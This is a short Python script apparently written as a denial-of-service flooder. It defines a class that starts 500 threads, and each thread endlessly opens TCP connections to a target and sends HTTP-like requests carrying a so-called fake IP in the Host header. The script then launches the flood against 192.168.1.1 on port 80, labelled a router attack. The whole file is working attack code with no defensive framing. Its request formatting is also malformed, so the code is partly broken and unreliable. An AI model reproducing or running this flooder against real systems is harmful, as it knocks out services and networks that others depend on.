import threading
import socket
class Dodos:

    def __init__(self,target,port,fake_ip,thread_quantity):
        self.target=target
        self.port=port
        self.fake_ip=fake_ip
        self.thread_quantity=thread_quantity
        self.count=0
    def attack(self):
        while True:
            con=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            con.connect((self.target,self.port))
            con.sendto(("Get/"+self.target+"HTTP/1.1\r\n").encode('ascii'),(self.target,self.port))
            con.sendto(("Host: "+self.fake_ip+"\r\n\r\n").encode('ascii'),(self.target,self.port))
            con.close()
            self.count = self.count + 1
            print(self.count)


    def thrading(self):
        for i in range(self.thread_quantity):
            print(i)
            main=threading.Thread(target=self.attack)
            main.start()



router_attack=Dodos("192.168.1.1",80,"182.21.20.32",500).thrading()